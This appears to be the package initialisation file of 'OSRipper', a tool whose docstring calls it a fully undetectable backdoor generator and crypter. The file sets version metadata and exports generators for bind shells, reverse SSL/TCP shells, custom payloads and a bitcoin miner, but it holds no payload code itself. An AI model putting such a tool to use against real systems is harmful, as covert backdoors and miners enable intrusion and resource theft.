#!/usr/bin/env python3
"""
OSRipper - Advanced Payload Generator and Crypter
A sophisticated, fully undetectable (FUD) backdoor generator and crypter.

Author: NoahOksuz
License: MIT
Version: 0.4.0
"""

__version__ = "0.4.0"
__author__ = "NoahOksuz"
__license__ = "MIT"

# Import main functionality for easier access
from .main import (
    gen_bind,
    gen_rev_ssl_tcp,
    gen_custom,
    gen_btc_miner,
    main,
)

__all__ = [
    "__version__",
    "__author__",
    "__license__",
    "gen_bind",
    "gen_rev_ssl_tcp",
    "gen_custom",
    "gen_btc_miner",
    "main",
]

